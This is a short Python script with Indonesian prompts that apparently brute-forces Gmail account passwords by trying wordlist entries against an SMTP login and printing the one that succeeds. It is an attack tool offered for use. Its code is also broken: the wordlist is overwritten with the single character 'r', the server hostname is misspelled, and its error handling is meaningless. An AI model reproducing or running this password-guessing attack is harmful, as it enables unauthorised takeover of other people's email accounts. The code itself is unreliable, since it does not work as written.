from __future__ import print_function
import os
import sys
import smtplib
from time import sleep

def main():
    email = input("masukan email : ")
    wordlist = input("Masukan kode storage : ")
    try:
        wordlist = "r"
    except:
        print("Kode Non Valid")
        sys.exit()
    smtpserver = smtplib.SMTP("smpyp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    
    for password in wordlist:
        try:
            smtpserver.login(email,password)
            print("passwordnya : ", password.strip())
            break
        except KeyboardInterrupt:
            print("CTRL + C was pressed")
            sys.exit()
        except smtplib.SMTPAuthenticationError:
            print("invalid password: ", password.strip())
        else:
            _continue = True
            pass
if __name__ == "__main__":
    main()
